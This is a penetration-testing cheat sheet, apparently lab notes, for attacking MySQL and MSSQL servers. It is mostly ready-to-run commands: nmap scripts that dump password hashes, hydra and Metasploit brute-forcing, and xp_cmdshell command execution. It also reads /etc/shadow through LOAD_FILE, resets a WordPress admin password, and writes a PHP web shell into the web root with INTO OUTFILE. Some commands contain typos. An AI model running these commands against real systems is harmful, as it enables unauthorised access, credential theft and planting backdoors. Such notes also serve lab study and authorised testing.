### Nmap Scripts
```shell-session
$ sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*
```

```
nmap 0.0.0.0 -SV -p 3306 —script=mysql-empty-password

nmap 0.0.0.0 -SV -p 3306 —script=mysql-info

nmap 0.0.0.0 -SV -p 3306 —script=mysql-users —script-args=”mysqluser=’root’, mysqlpass=’’”

nmap 0.0.0.0 -SV -p 3306 —script=mysql-databases—script-args=”mysqluser=’root’, mysqlpass=’’”

nmap 0.0.0.0 -SV -p 3306 —script=mysql-variables —script-args=”mysqluser=’root’, mysqlpass=’’”

nmap 0.0.0.0 -SV -p 3306 —script=mysql-audit—script-args=”mysql-audit.username=’root’, mysql-audit.password=’’”,mysql-audit.filename=’/usr/share/nmap/nselib/data/mysql-cis.audit’”

nmap 0.0.0.0 -SV -p 3306 —script=mysql-dump-hashes —script-args=”username=’root’, password=’’”

nmap 0.0.0.0 -SV -p 3306 —script=mysql-query —script-args=”query=’select count(*) from books.authors;’,username=’root’, password=’’”
```
### BRUTEFORCE

```shell-session
$ hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 0.0.0.0 mysql
```
## sqsh
```shell-session
$ sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
```
```shell-session
$ sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
```


```shell-session
$ mssqlclient.py -p 1433 julio@10.129.203.7 
```
### Trying login

```shell-sesion
$ mysql -h 0.0.0.0 -u root
```
```shell-session
$ mysql -u root -pP4SSw0rd -h 10.129.14.128
```
### Useful SQL Commands

```shell-session
$ mysql -u <user> -p<password> -h <IP address>

$ show databases;

$ use books;

$ show tables;

$ select * from <table>;

$ show columns from <table>;

$ select * from <table> where <column> = "<string>";

$ select load_file(”/etc/shadow”)

$ UPDATE wp_users SET user_pass = MD5('password123') WHERE user_login = 'admin';

http://<TARGET-IP>/8585/wordpress/wp-admin
```
#### XP_CMDSHELL
```cmd-session
1> xp_cmdshell 'whoami'
2> GO
```
## Write Local Files
```shell-session
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```
#### MySQL - Secure File Privileges
```shell-session
mysql> show variables like "secure_file_priv";
```
## Read Local Files
```shell-session
mysql> select LOAD_FILE("/etc/passwd");
```
### Metasploit Modules

``` shell-session
> MYSQL:

- use /auxiliary/scanner/mysql/mysql_login
> set pass_file /usr/share/metasploit_framework/data/wordlists/unix_passwords.txt
> set stop_on_succes true

- auxiliary/admin/mysql/mysql_enum

- auxiliary/admin/mysql/mysql_sql

- auxiliary/scanner/mysql/mysql_file_enum

- auxiliary/scanner/mysql/mysql_hashdump

- auxiliary/scanner/mysql/mysql_login

- auxiliary/scanner/mysql/mysql_schemadump

- auxiliary/scanner/mysql/mysql_version

- auxiliary/scanner/mysql/mysql_writable_dirs
```